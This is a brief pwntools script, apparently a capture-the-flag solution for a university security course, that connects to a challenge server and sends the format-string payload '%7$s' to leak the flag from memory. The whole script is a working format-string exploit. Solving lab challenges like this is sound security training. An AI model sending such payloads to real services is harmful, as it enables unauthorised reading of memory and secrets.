from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = "22191"

r = remote(SERVER,PORT)

msg= (b"%7$s")

r.sendline(msg)

print(f"Flag: {r.recvall().decode()}")

r.close()